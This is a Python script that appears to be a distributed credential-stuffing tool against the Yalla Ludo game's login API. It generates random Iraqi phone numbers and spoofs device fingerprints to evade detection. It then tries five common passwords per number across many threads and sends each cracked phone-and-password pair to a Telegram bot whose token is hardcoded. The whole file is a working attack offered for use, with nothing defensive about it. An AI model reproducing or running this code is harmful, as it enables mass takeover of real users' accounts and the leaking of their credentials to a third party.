import base64
import json
import hashlib
import requests
import random
import threading
import time
import os
import sys
import uuid
import datetime
from datetime import timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

# ==================== Time Management ====================
END_TIME = datetime.datetime(2026, 9, 1, 12, 1, 0)
# =========================================================

# ==================== Colors ====================
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA = True
except ImportError:
    COLORAMA = False
    class Dummy:
        pass
    Fore = Back = Style = Dummy()
    Fore.GREEN = Fore.RED = Fore.YELLOW = Fore.CYAN = Fore.MAGENTA = Fore.WHITE = ''
    Back.GREEN = Back.RED = Back.YELLOW = Back.WHITE = Back.BLACK = ''
    Style.BRIGHT = ''
    Style.RESET_ALL = ''

# ==================== XOR & Encryption ====================
XOR_KEY = bytes.fromhex(
    "6234613461336666313732633464363563613563343038356662613135383639"
)

def xor_encrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def xor_decrypt(data):
    return bytes(value ^ XOR_KEY[index % len(XOR_KEY)] for index, value in enumerate(data))

def build_payload(payload_dict):
    json_bytes = json.dumps(payload_dict, separators=(",", ":")).encode("utf-8")
    encrypted = xor_encrypt(json_bytes)
    return {"paramJsonString": base64.b64encode(encrypted).decode("utf-8")}

def decode_param(param_b64):
    decoded = base64.b64decode(param_b64)
    decrypted = xor_decrypt(decoded)
    return json.loads(decrypted.decode("utf-8"))

def get_md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

# ==================== Dynamic Device Fingerprints ====================
def generate_dynamic_devices():
    dev_id = str(uuid.uuid4())
    android_id = f"{hex(random.randint(0, 0xffffffffffffffff))[2:]}_{hex(random.randint(0, 0xffffffffffff))[2:]}"
    shu_meng_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=36))
    nonce = f"-{random.randint(100000000, 999999999)}_{str(uuid.uuid4())}"
    return dev_id, android_id, shu_meng_id, nonce

# ==================== Base Payload ====================
BASE_PAYLOAD = {
    "mobile": "",
    "areaCode": "",
    "password": "",
    "languageId": 2,
    "nationalityId": "1",
    "hostConfig": [
        {"bizType": 5000, "countryCode": "IQ", "hostUrl": "https://api-shumeng.yalla.games", "type": 2, "version": 4},
        {"bizType": 5004, "countryCode": "IQ", "hostUrl": "https://httpgateway.penabcd.com", "type": 2, "version": 6},
        {"bizType": 5005, "countryCode": "IQ", "hostUrl": "https://api.lightkvd.com", "type": 2, "version": 4},
        {"bizType": 1000, "countryCode": "IQ", "hostUrl": "https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com", "type": 2, "version": 19},
        {"bizType": 1004, "countryCode": "IQ", "hostUrl": "https://activity.carrstuv.com,https://activity.yalla.games,https://activity.foodjkl.com", "type": 2, "version": 17},
        {"bizType": 3000, "countryCode": "IQ", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
    ],
    "simCountry": "IQ",
    "version": "1.4.9.2",
    "deviceName": "realme RMX3085",
    "deviceType": 2,
    "downloadChannelId": 1,
    "plateType": 0,
    "phoneModel": "RMX3085",
    "X-Phone-Country": "IQ",
    "X-Sim-Country": "IQ",
    "IsSubpackages": 0,
    "appType": 0,
}

# ==================== Original Headers ====================
URL = "https://account.foodjkl.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
HEADERS = {
    'Host': "httpgateway.foodjkl.com",
    'User-Agent': "YallaLudo-1.4.9.2-(Build 1040922)-Android 33",
    'Accept-Encoding': "gzip",
    'traceparent': "00-348e0b76cef493a3e57a99a987025491-182297e2ba6b399d-00",
    'baggage': "service.name=ludo",
    'userid': "0",
    'x-app-id': "ludo",
    'x-baggage': "eyJ0aW1lU3BhbiI6IjE3ODY5MzI4MTQxNTQiLCJ2ZXJzaW9uIjoiMS40LjkuMiIsImRldmljZUlkIjoiZjhhMzcyNzYtYmZjOS00Mzc5LWEwZTctNjM4YTRkZDZkZDE1IiwiZGV2aWNlTmFtZSI6InJlYWxtZSBSTVgzMDg1IiwiZGV2aWNlVHlwZSI6MiwiZG93bmxvYWRDaGFubmVsSWQiOjEsInNodU1lbmdJZCI6IkRVWm8ybzJvZDltbWtBb1VCZnNFbEdYNGZEb2lXNlhudDNnZCIsIm5vbmNlIjoiMTUyMzUxODU3Nl83NzAzMzBhYi00ZTU0LTRkMDEtODY2MS1iMzRjMDQ5ZTlkMTkiLCJwbGF0ZVR5cGUiOjAsIkxhbmd1YWdlSWQiOjIsInBob25lTW9kZWwiOiJSTVgzMDg1IiwiWC1QaG9uZS1Db3VudHJ5IjoiSVEiLCJYLVNpbS1Db3VudHJ5IjoiSVEiLCJBbmRyb2lkSWQiOiJmZjZjODMxODMzYzgzNTU4YTRlN2VhYzE3MjA3YmQ1OV9lMzhkYjc5ZWIxMWY3MzUyIiwiYXBwVHlwZSI6MH0=",
    'x-access-token': "",
    'x-timestamp': "1786932814156",
    'versionstring': "1.4.9.2",
    'x-sign': "2.0_2_460c20e40f18b5064072f0f016bb251e2195375a9ccae959cdf81810e3567397",
    'x-hera': "4bdf489287d844a0bbbea4c99f077401",
    'x-medusa': "vr8LPiE0Corx8gmHD0x6qRVmh82L9rO/m5K9M9aeGM3NjHEERdokye6JEL2Hih3li/THwtbhoopUmoKNfGTBd7F+JbOPuT7SGbQC4ilJyNk=",
    'content-type': "application/json; charset=utf-8"
}

# ==================== Passwords List ====================
PASSWORDS = [
    "1234qwer",
    "qwer1234",
    "zzzzxxxx",
    "qqqqwwww",
    "Aa123456"
]

# ==================== Bot Variables ====================
BOT_TOKEN = ""
CHAT_ID = ""

# ==================== Shared Variables ====================
results = []
stats = defaultdict(int)
lock = threading.Lock()
stop_flag = False
MAX_RESULTS = 2000          # Required good results limit (0 = no limit)
BLOCKS_PER_LINE = 50

# ---------- Used Numbers Management ----------
USED_FILE = "used_numbers.txt"
used_numbers = set()
used_lock = threading.Lock()

def load_used_numbers():
    global used_numbers
    if os.path.exists(USED_FILE):
        with open(USED_FILE, 'r') as f:
            for line in f:
                num = line.strip()
                if num:
                    used_numbers.add(num)
    else:
        open(USED_FILE, 'w').close()

def save_used_number(num):
    with used_lock:
        with open(USED_FILE, 'a') as f:
            f.write(num + '\n')

# ==================== Telegram Sender ====================
def send_telegram(phone, pwd):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        message = f"""
📞 Phone : <code>{phone}</code>
🔑 Pass   : <code>{pwd}</code>

<a href="tg://resolve?domain=DD36DD">@DD36DD</a>
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

# ==================== Speed Configuration (Threads Setup) ====================
def ضبط_السرعة():
    """
    Asks the user to input the required number of threads (between 10 and 200)
    and returns the entered value.
    """
    print(Fore.CYAN + "\n[⚡] Speed Settings:" + Style.RESET_ALL)
    while True:
        try:
            threads = input(Fore.YELLOW + "Enter number of threads (recommended between 30 and 100): " + Style.RESET_ALL)
            threads = int(threads)
            if 10 <= threads <= 200:
                return threads
            else:
                print(Fore.RED + "The number must be between 10 and 200." + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + "Please enter a valid integer." + Style.RESET_ALL)

# ==================== Check Single Number (Using Session) ====================
def check_number(mobile):
    global results, stats, used_numbers, stop_flag
    if stop_flag:
        return

    save_used_number(mobile)

    # Create a dedicated Session for the current thread
    session = requests.Session()
    session.headers.update(HEADERS)

    current_ts = str(int(time.time() * 1000))
    session.headers['x-timestamp'] = current_ts
    session.headers['x-time'] = current_ts

    payload_dict = BASE_PAYLOAD.copy()
    dev_id, android_id, shu_meng_id, nonce = generate_dynamic_devices()
    payload_dict["deviceId"] = dev_id
    payload_dict["AndroidId"] = android_id
    payload_dict["shuMengId"] = shu_meng_id
    payload_dict["nonce"] = nonce
    payload_dict["mobile"] = mobile
    payload_dict["areaCode"] = "964"
    first_pwd = PASSWORDS[0]
    payload_dict["password"] = get_md5(first_pwd)

    try:
        enc_payload = build_payload(payload_dict)
        resp = session.post(URL, json=enc_payload, timeout=10)
        if resp.status_code != 200:
            with lock:
                results.append("error")
                stats['error'] += 1
                stats['total'] += 1
            return
        data = resp.json()
        if "paramJsonString" in data and isinstance(data["paramJsonString"], str):
            try:
                data = decode_param(data["paramJsonString"])
            except:
                pass
        status = data.get("status", -1)
        tips = data.get("tips", "")
    except Exception:
        with lock:
            results.append("error")
            stats['error'] += 1
            stats['total'] += 1
        return

    if status == 0:
        with lock:
            results.append("good")
            stats['good'] += 1
            stats['total'] += 1
            if MAX_RESULTS > 0 and stats['good'] >= MAX_RESULTS:
                stop_flag = True
        send_telegram(mobile, first_pwd)
        return

    elif status == 151 or ("كلمة السر" in tips and "خاطئة" in tips) or ("password" in tips.lower() or "wrong" in tips.lower()):
        found_good = False
        good_pwd = None
        # Check remaining passwords quickly using the same Session
        for pwd in PASSWORDS[1:]:
            try:
                current_ts = str(int(time.time() * 1000))
                session.headers['x-timestamp'] = current_ts
                session.headers['x-time'] = current_ts

                payload_dict["password"] = get_md5(pwd)
                enc_payload = build_payload(payload_dict)
                resp = session.post(URL, json=enc_payload, timeout=10)
                if resp.status_code != 200:
                    continue
                data = resp.json()
                if "paramJsonString" in data:
                    try:
                        data = decode_param(data["paramJsonString"])
                    except:
                        pass
                if data.get("status", -1) == 0:
                    found_good = True
                    good_pwd = pwd
                    break
            except Exception:
                continue

        if found_good:
            with lock:
                results.append("good")
                stats['good'] += 1
                stats['total'] += 1
                if MAX_RESULTS > 0 and stats['good'] >= MAX_RESULTS:
                    stop_flag = True
            send_telegram(mobile, good_pwd)
        else:
            with lock:
                results.append("wrong")
                stats['wrong_pass'] += 1
                stats['total'] += 1
        return

    else:
        with lock:
            results.append("notreg")
            stats['not_registered'] += 1
            stats['total'] += 1
        return

# ==================== Unique Mobile Generator (Optimized) ====================
def generate_mobile():
    global used_numbers
    while True:
        prefixes = ["77", "78", "5"]
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choice('0123456789') for _ in range(8))
        mobile = prefix + suffix
        if mobile not in used_numbers:
            used_numbers.add(mobile)
            return mobile

# ==================== Dashboard ====================
def print_dashboard():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""
███████╗██╗   ██╗██████╗ ███████╗██████╗
        ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
        ███████╗ ╚████╔╝ ██████╔╝█████╗  ██████╔╝
        ╚════██║  ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
        ███████║   ██║   ██████╔╝███████╗██║  ██║
        ╚══════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""
    print(Fore.CYAN + banner + Style.RESET_ALL)
    print("\n")
    print(Fore.MAGENTA + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + Style.RESET_ALL)
    print()
    with lock:
        total = stats['total']
        good = stats['good']
        wrong = stats['wrong_pass']
        notreg = stats['not_registered']
        errors = stats['error']
    print(f"  {Fore.CYAN}Total: {total}{Style.RESET_ALL} | "
          f"{Fore.GREEN}Good: {good}{Style.RESET_ALL} | "
          f"{Fore.YELLOW}Wrong Pass: {wrong}{Style.RESET_ALL} | "
          f"{Fore.RED}Not Reg: {notreg}{Style.RESET_ALL} | "
          f"{Fore.WHITE}Errors: {errors}{Style.RESET_ALL}")

def dashboard_loop():
    while not stop_flag:
        if datetime.datetime.now() >= END_TIME:
            exit("\x1b[1;92mSorry, the time limit for running the tool has expired. Contact developer: @SYRPY")
        print_dashboard()
        time.sleep(1)

# ==================== Main Execution ====================
def main():
    if datetime.datetime.now() >= END_TIME:
        exit("\x1b[1;92mSorry, the time limit for running the tool has expired. Contact developer: @SYRPY")
        
    global stop_flag, BOT_TOKEN, CHAT_ID, used_numbers, MAX_RESULTS

    load_used_numbers()
    print(f"[+] Loaded {len(used_numbers)} previously used numbers.")

    CHAT_ID = input("Enter Telegram Chat ID: ").strip()
    BOT_TOKEN = "8241424610:AAEYJW7_0kfRXKAyIQoC5y7tUU37L_amAjs"  # Static token

    # ====== Speed Setup ======
    THREADS = ضبط_السرعة()

    # Optional: Max good results limit
    max_good_input = input(Fore.YELLOW + "Enter required good results limit (0 = unlimited): " + Style.RESET_ALL)
    try:
        MAX_RESULTS = int(max_good_input)
    except:
        MAX_RESULTS = 0

    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        try:
            while not stop_flag:
                if datetime.datetime.now() >= END_TIME:
                    exit("\x1b[1;92mSorry, time limit reached.")
                mob = generate_mobile()
                futures.append(executor.submit(check_number, mob))
                # Maintain futures list size to avoid memory leaks
                if len(futures) > 2000:
                    for f in as_completed(futures[:500]):
                        pass
                    futures = futures[500:]
        except KeyboardInterrupt:
            print("\nStopped by user.")
            stop_flag = True

        for f in as_completed(futures):
            pass

    time.sleep(1)
    print("\nFinished. Final Statistics:")
    print(f"Good: {stats['good']}, Wrong Pass: {stats['wrong_pass']}, Not Reg: {stats['not_registered']}, Errors: {stats['error']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
